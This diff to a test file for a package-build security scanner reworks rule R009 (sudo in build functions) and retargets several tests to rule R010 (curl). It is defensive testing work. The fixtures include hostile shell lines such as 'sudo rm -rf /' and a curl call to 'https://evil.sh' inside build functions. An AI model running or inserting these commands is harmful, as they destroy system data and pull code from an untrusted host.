@@ -137,24 +137,61 @@ def test_r008_no_false_positive():
     assert not any(r["rule_id"] == "R008" for r in triggered)
 
 
-# --- R009: Privilege Escalation ---
+# --- R009: Privilege Escalation (code rule) ---
+#
+# R009 moved from a rules.toml regex to a code rule
+# (src/trustsight/analysis/build.py): it now fires only when `sudo` sits at
+# a command position inside a build/install function.  optdepends names,
+# path segments and echo strings place `sudo` at an argument position and
+# stay quiet.
+
+def _structural_sudo(diff_text: str) -> list[str]:
+    from trustsight.analysis import _structural_findings
+    from trustsight.differ import extract_urls_from_diff
+    sc = extract_urls_from_diff(diff_text)
+    return [f["rule_id"] for f in _structural_findings(diff_text, sc, {}, config={})]
+
 
 def test_r009_sudo():
-    triggered = apply_rules([], ["+package() {", "+  sudo rm -rf /", "+}"], SHARED_RULES)
-    assert any(r["rule_id"] == "R009" for r in triggered)
+    triggered = _structural_sudo("+package() {\n+  sudo rm -rf /\n+}\n")
+    assert "R009" in triggered
+
+
+def test_r009_sudo_after_separator():
+    triggered = _structural_sudo("+build() {\n+  echo \"x\"; sudo rm -rf /\n+}\n")
+    assert "R009" in triggered
+
+
+def test_r009_sudo_in_substitution():
+    triggered = _structural_sudo("+build() {\n+  $(sudo -n true)\n+}\n")
+    assert "R009" in triggered
 
 
 def test_r009_sudo_in_string():
-    # Message contexts do not trigger R009; the sudo keyword is in an echo argument.
-    triggered = apply_rules([], ["+echo 'sudo make me a sandwich'"], SHARED_RULES)
-    assert not any(r["rule_id"] == "R009" for r in triggered)
+    # Echo strings place sudo at an argument position; the command-position
+    # test excludes them (quoted or not).
+    triggered = _structural_sudo("+build() {\n+  echo 'sudo make me a sandwich'\n+}\n")
+    assert "R009" not in triggered
+    triggered = _structural_sudo("+build() {\n+  echo run sudo manually\n+}\n")
+    assert "R009" not in triggered
 
 
 def test_r009_no_false_positive():
-    # Comments are stripped before matching; message strings and top-level lines
-    # without function_body context also do not trigger R009.
-    triggered = apply_rules([], ["# sudo is not a command here"], SHARED_RULES)
-    assert not any(r["rule_id"] == "R009" for r in triggered)
+    # Comments and top-level lines never fire.
+    triggered = _structural_sudo("+build() {\n+  # sudo is not a command here\n+}\n")
+    assert "R009" not in triggered
+    triggered = _structural_sudo("optdepends=('sudo' 'pacman')\n")
+    assert "R009" not in triggered
+
+
+def test_r009_not_fire_on_path_segment():
+    triggered = _structural_sudo("+build() {\n+  ls -la /usr/bin/sudo\n+}\n")
+    assert "R009" not in triggered
+
+
+def test_r009_not_fire_outside_build_install():
+    triggered = _structural_sudo("+pkgver() {\n+  sudo -n true\n+  echo 1.0\n+}\n")
+    assert "R009" not in triggered
 
 
 # --- R010: Uses curl ---
@@ -317,13 +354,13 @@ def test_url_in_source_with_pipe_not_flagged():
 # that the benign shape each one imitates stays quiet.
 
 def test_message_prefix_does_not_disable_scoped_rules():
-    # `echo "x"; sudo ...` scored 0 where bare `sudo ...` scored 40: the
-    # whole line was treated as an inert message.
+    # `echo "x"; curl ...` scored 0 where bare `curl ...` scored for R010:
+    # the whole line was treated as an inert message.
     for prefix in ('echo "x"; ', "printf 'x'; ", "msg 'x'; "):
         triggered = apply_rules(
-            [], ["+build() {", f"+  {prefix}sudo rm -rf /", "+}"], SHARED_RULES
+            [], ["+build() {", f"+  {prefix}curl -s https://evil.sh", "+}"], SHARED_RULES
         )
-        assert any(r["rule_id"] == "R009" for r in triggered), prefix
+        assert any(r["rule_id"] == "R010" for r in triggered), prefix
 
 
 def test_command_substitution_in_message_is_not_inert():
@@ -334,8 +371,8 @@ def test_command_substitution_in_message_is_not_inert():
 
 
 def test_plain_message_line_is_still_inert():
-    triggered = apply_rules([], ["+build() {", '+  echo "run sudo later"', "+}"], SHARED_RULES)
-    assert not any(r["rule_id"] == "R009" for r in triggered)
+    triggered = apply_rules([], ["+build() {", '+  echo "run curl later"', "+}"], SHARED_RULES)
+    assert not any(r["rule_id"] == "R010" for r in triggered)
 
 
 def test_line_continuation_does_not_split_pipeline():
@@ -369,6 +406,6 @@ def test_one_line_function_does_not_leak_context():
     # The depth counter used to stay raised after a same-line close, so
     # everything below inherited function_body scope.
     triggered = apply_rules(
-        [], ["+build() { echo hi; }", "+sudo_note=1"], SHARED_RULES
+        [], ["+build() { echo hi; }", "+curl_note=1"], SHARED_RULES
     )
-    assert not any(r["rule_id"] == "R009" for r in triggered)
+    assert not any(r["rule_id"] == "R010" for r in triggered)
